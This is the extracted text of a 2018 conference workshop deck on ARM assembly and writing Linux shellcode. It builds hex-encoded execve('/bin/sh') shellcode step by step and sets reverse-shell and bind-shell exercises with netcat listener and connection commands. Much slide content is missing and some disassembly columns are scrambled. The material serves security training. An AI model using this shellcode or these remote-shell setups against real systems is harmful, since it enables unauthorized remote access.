Lab: ARM Assembly Shellcode
From Zero to ARM Assembly Bind Shellcode

HITBSecConf2018 - Amsterdam

1

Learning Objectives

· ARM assembly basics
· Registers · Most common instructions · ARM vs. Thumb · Load and Store · Literal Pool · PC-relative Addressing · Branches

· Writing ARM Shellcode
· System functions · Mapping out parameters · Translating to Assembly · De-Nullification · Execve() shell · Reverse Shell · Bind Shell

HITBSecConf2018 - Amsterdam

2

Outline ­ 120 minutes

· ARM assembly basics
· 15 ­ 20 minutes
· Shellcoding steps: execve
· 10 minutes
· Getting ready for practical part
· 5 minutes

· Reverse Shell
· 3 functions · For each:
· 10 minutes exercise · 5 minutes solution
· Buffer[10]
· Bind Shell
· 3 functions · 25 minutes exercise

HITBSecConf2018 - Amsterdam

3

Mobile and Iot bla bla

HITBSecConf2018 - Amsterdam

4

It`s getting interesting...

HITBSecConf2018 - Amsterdam

5

Benefits of Learning ARM Assembly

· Reverse Engineering binaries on...

· Phones?

· Routers?

· Cars? · Internet of Things? · MACBOOKS?? · SERVERS??

· Intel x86 is nice but..
· Knowing ARM assembly allows you to dig into and have fun with various different device types

HITBSecConf2018 - Amsterdam

6

Benefits of writing ARM Shellcode
· Writing your own assembly helps you to understand assembly
· How functions work · How function parameters are handled · How to translate functions to assembly for any purpose

· Learn it once and know how to write your own variations
· For exploit development and vulnerability research
· You can brag that you can write your own shellcode instead of having to rely on exploit-db or tools

HITBSecConf2018 - Amsterdam

7

ARM Assembly Basics
15 ­ 20 minutes

HITBSecConf2018 - Amsterdam

8

ARM CPU Features
· RISC (Reduced Instruction Set Computing) processor
· Simplified instruction set · More registers than in CISC (Complex Instruction Set Computing)
· Load/Store architecture
· No direct operations on memory
· 32-bit ARM mode / 16-bit Thumb mode · Conditional Execution on almost all instructions (ARM mode only) · Inline Barrel Shifter · Word aligned memory access (4 byte aligned)

ARM Architecture and Cores

Arch

W

ARMv6

32

ARMv6-M 32

ARMv7-M 32 ARMv7E-M 32

ARMv7-R 32

ARMv7-A 32 ARMv8-A 32 ARMv8-A 64

Processor Family
ARM11
ARM Cortex-M0, ARM Cortex-M0+, ARM Cortex-M1, SecurCore SC000
ARM Cortex-M3, SecurCore SC300
ARM Cortex-M4, ARM Cortex-M7
ARM Cortex-R4, ARM Cortex-R5, ARM Cortex-R7, ARM Cortex-R8
ARM Cortex-A5, ARM Cortex-A7, ARM Cortex-A8, ARM Cortex-A9, ARM Cortex-A12, ARM Cortex-A15, ARM Cortex-A17
ARM Cortex-A32
ARM Cortex-A35, ARM Cortex-A53, ARM Cortex-A57, ARM Cortex-A72

ARM Architecture and Cores

Arch

W

ARMv6

32

ARMv6-M 32

ARMv7-M 32 ARMv7E-M 32

ARMv7-R 32

ARMv7-A 32 ARMv8-A 32 ARMv8-A 64

Processor Family
ARM11
ARM Cortex-M0, ARM Cortex-M0+, ARM Cortex-M1, SecurCore SC000
ARM Cortex-M3, SecurCore SC300
ARM Cortex-M4, ARM Cortex-M7
ARM Cortex-R4, ARM Cortex-R5, ARM Cortex-R7, ARM Cortex-R8
ARM Cortex-A5, ARM Cortex-A7, ARM Cortex-A8, ARM Cortex-A9, ARM Cortex-A12, ARM Cortex-A15, ARM Cortex-A17
ARM Cortex-A32
ARM Cortex-A35, ARM Cortex-A53, ARM Cortex-A57, ARM Cortex-A72

ARM CPU Registers

ARM CPU Registers

Most Common Instructions

Thumb Instructions
· ARM core has two execution states: ARM and Thumb
· Switch state with BX instruction
· Thumb is a 16-bit instruction set
· Other versions: Thumb-2 (16 and 32-bit), ThumbEE · For us: useful to get rid of NULL bytes in our shellcode
· Most Thumb instructions are executed unconditionally 

Conditional Execution

Load / Store instructions
· ARM is a Load / Store Architecture
· Does not support memory to memory data processing operations · Must move data values into register before using them
· This isn't as inefficient as it sounds:
· Load data values from memory into registers · Process data in registers using a number of data processing instructions
· which are not slowed down by memory access
· Store results from registers out of memory
· Three sets of instructions which interact with main memory:
· Single register data transfer (LDR/STR) · Block data transfer (LDM/STM) · Single Data Swap (SWP)

Load / Store Instructions
· Load and Store Word or Byte
· LDR / STR / LDRB / STRB
· Can be executed conditionally  · Syntax:
· <LDR|STR>{<cond>}{<size>} Rd, <address>

HITBSecConf2018 - Amsterdam

19

Replace X with null-byte

HITBSecConf2018 - Amsterdam

20

Replace X with null-byte

HITBSecConf2018 - Amsterdam

21

Store Byte (STRB)

HITBSecConf2018 - Amsterdam

22

Load Immediate Values...

.section .text

.global _start

_start:

mov

r0, #511

bkpt

azeria@labs:~$ as test.s -o test.o test.s: Assembler messages: test.s:5: Error: invalid constant (1ff) after fixup

*https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py

Load Immediate values

HITBSecConf2018 - Amsterdam

24

Load Immediate values

HITBSecConf2018 - Amsterdam

25

Load Immediate values

HITBSecConf2018 - Amsterdam

26

Load Immediate values

HITBSecConf2018 - Amsterdam

27

Solution: LDR or Split

HITBSecConf2018 - Amsterdam

28

Literal Pool

HITBSecConf2018 - Amsterdam

29

PC-relative Addressing

HITBSecConf2018 - Amsterdam

30

Branches

HITBSecConf2018 - Amsterdam

31

Branches

HITBSecConf2018 - Amsterdam

32

Thumb mode

HITBSecConf2018 - Amsterdam

33

Shellcoding

HITBSecConf2018 - Amsterdam

34

How to Shellcode
· Step 1: Figure out the system call that is being invoked · Step 2: Figure out the number of that system call · Step 3: Map out parameters of the function · Step 4: Translate to assembly · Step 5: Dump disassembly to check for null bytes · Step 6: Get rid of null bytes  de-nullifying shellcode · Step 7: Convert shellcode to hex

HITBSecConf2018 - Amsterdam

35

Step 1: Tracing System calls

We want to translate the following code into ARM assembly:
#include <stdio.h>
void main(void) {
system("/bin/sh"); }

azeria@labs:~$ gcc system.c -o system azeria@labs:~$ strace -h -f -- follow forks, -ff -- with output into separate files -v -- verbose mode: print unabbreviated argv, stat, termio[s], etc. args --- snip --
azeria@labs:~$ strace -f -v system
--- snip --
[pid 4575] execve("/bin/sh", ["/bin/sh"], ["MAIL=/var/mail/pi", "SSH_CLIENT=192.168.200.1 42616 2"..., "USER=pi", "SHLVL=1", "OLDPWD=/home/azeria", "HOME=/home/azeria", "XDG_SESSION_COOKIE=34069147acf8a"..., "SSH_TTY=/dev/pts/1", "LOGNAME=pi", "_=/usr/bin/strace", "TERM=xterm", "PATH=/usr/local/sbin:/usr/local/"..., "LANG=en_US.UTF-8", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "SHELL=/bin/bash", "EGG=AAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., "LC_ALL=en_US.UTF-8", "PWD=/home/azeria/", "SSH_CONNECTION=192.168.200.1 426"...]) =

HITBSecConf2018 - Amsterdam

36

Step 2: Figure out Syscall number
azeria@labs:~$ grep execve /usr/include/arm-linux-gnueabihf/asm/unistd.h #define __NR_execve (__NR_SYSCALL_BASE+ 11)

HITBSecConf2018 - Amsterdam

37

Step 3: Mapping out parameters
· execve(*filename, *argv[], *envp[]) · Simplification
· argv = NULL · envp = NULL
· Simply put:
· execve(*filename, 0, 0)

HITBSecConf2018 - Amsterdam

38

Step 3: Mapping out Parameters

HITBSecConf2018 - Amsterdam

39

Structure of an Assembly Program
.section .text .global _start
_start: .code 32 <instruction> <instruction>
.code 16 <thumb instruction>
.ascii "some string"

HITBSecConf2018 - Amsterdam

40

Step 4: Translate to Assembly

HITBSecConf2018 - Amsterdam

41

Step 5: Check for Null Bytes

pi@raspberrypi:~$ as execve.s -o execve.o && ld ­N execve.o -o execve pi@raspberrypi:~$ objdump -d ./execve

./execve: file format elf32-littlearm

Disassembly of section .text:

00010054 <_start>: 10054: e28f000c add 10058: e3a01000 mov 1005c: e3a02000 mov 10060: e3a0700b mov 10064: ef000000 svc

r0, pc, #12 r1, #0 r2, #0 r7, #11 0x00000000

00010068 <binsh>: 10068: 6e69622f 1006c: 0068732f

.word .word

0x6e69622f 0x0068732f

Step 6: De-Nullify

HITBSecConf2018 - Amsterdam

43

pi@raspberrypi:~/asm $ objdump -d execve_final

execve_final:

file format elf32-littlearm

Disassembly of section .text:

00010054 <_start>:

10054:

e28f3001

10058:

e12fff13

1005c:

a002

1005e:

1a49

10060:

1c0a

10062:

71c2

10064:

270b

10066:

df01

add bx add subs adds strb movs svc

r3, pc, #1 r3 r0, pc, #8 r1, r1, r1 r2, r1, #0 r2, [r0, #7] r7, #11 1

00010068 <binsh>:

10068:

6e69622f

1006c:

5868732f

.word .word

0x6e69622f 0x5868732f

HITBSecConf2018 - Amsterdam

44

Step 7: Hexify
pi@raspberrypi:~$ objcopy -O binary execve_final execve_final.bin pi@raspberrypi:~$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' execve_final.bin \x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x1a\x0a\x1c\xc2\x71\x0b\x27\x01 \xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58

HITBSecConf2018 - Amsterdam

45

Practical Part
Reverse & bind shell

HITBSecConf2018 - Amsterdam

46

Prepare...

HITBSecConf2018 - Amsterdam

47

Prepare...
· Get ZIP with templates and slides From your PI: $ wget https://azeria-labs.com/downloads/HITB-1.zip
· Solutions: From your PI: $ wget https://azeria-labs.com/downloads/HITB-2.zip

HITBSecConf2018 - Amsterdam

48

Reverse shell

HITBSecConf2018 - Amsterdam

49

Template

HITBSecConf2018 - Amsterdam

50

Create Socket

HITBSecConf2018 - Amsterdam

51

Connect

HITBSecConf2018 - Amsterdam

52

STDin, STDout, STDerr

HITBSecConf2018 - Amsterdam

53

Spawning shell

HITBSecConf2018 - Amsterdam

54

Spawning shell

HITBSecConf2018 - Amsterdam

55

Testing your shellcode
pi@raspberrypi:~$ as reverse.s -o reverse.o && ld -N reverse.o -o reverse pi@raspberrypi:~$ ./reverse
user@ubuntu:~$ nc -lvvp 4444 Listening on [0.0.0.0] (family 0, port 4444) Connection from [192.168.72.129] port 4444 [tcp/*] accepted (family 2, sport 45326)

HITBSecConf2018 - Amsterdam

56

Bind shell

HITBSecConf2018 - Amsterdam

57

syscall numbers

pi@raspberrypi:~$ cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep <...>

#define __NR_socket (__NR_SYSCALL_BASE+281)

#define __NR_bind

(__NR_SYSCALL_BASE+282)

#define __NR_listen (__NR_SYSCALL_BASE+284)

#define __NR_accept (__NR_SYSCALL_BASE+285)

#define __NR_dup2

(__NR_SYSCALL_BASE+ 63)

#define __NR_execve (__NR_SYSCALL_BASE+ 11)

HITBSecConf2018 - Amsterdam

58

Bind Socket to Local Port

HITBSecConf2018 - Amsterdam

59

Listen for incoming connections

HITBSecConf2018 - Amsterdam

60

Accept incoming connections

HITBSecConf2018 - Amsterdam

61

Test your bind shell
Terminal 1: pi@raspberrypi:~$ strace -e execve,socket,bind,listen,accept,dup2 ./bind
Terminal 2: pi@raspberrypi:~ $ netstat -tlpn Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:4444 0.0.0.0:* LISTEN 1058/bind_test pi@raspberrypi:~ $ netcat -nv 0.0.0.0 4444 Connection to 0.0.0.0 4444 port [tcp/*] succeeded!

HITBSecConf2018 - Amsterdam

62

The end.
More resources at https://azeria-labs.com Twitter: @Fox0x01

HITBSecConf2018 - Amsterdam

63

